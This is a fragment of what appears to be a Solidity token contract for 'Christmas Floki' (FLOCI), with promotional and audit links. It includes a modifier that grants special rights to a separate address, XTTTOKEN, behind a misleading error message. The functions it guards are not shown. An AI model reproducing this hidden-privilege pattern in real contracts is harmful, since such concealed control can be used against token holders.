...
// https://christmasfloki.io/
// https://twitter.com/christmas_floki
// https://t.me/christmasfloki_official
// https://github.com/freshcoins/Smart-Contract-Audits/blob/main/ChristamasFloki_0xe5765E33E349B2Dcf22A37b2b4E87c10ad43F165.pdf
...
contract FLOCI is XTTContext, XTTIERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Christmas Floki";
    string private _symbol = "FLOCI";
    uint8 private _decimals = 2;
    address public XTTTOKEN;
  ...
  modifier XTTOWNER () {
    require(XTTTOKEN == msg.sender, "ERC20: permit Pancake address");
    _;
  }   
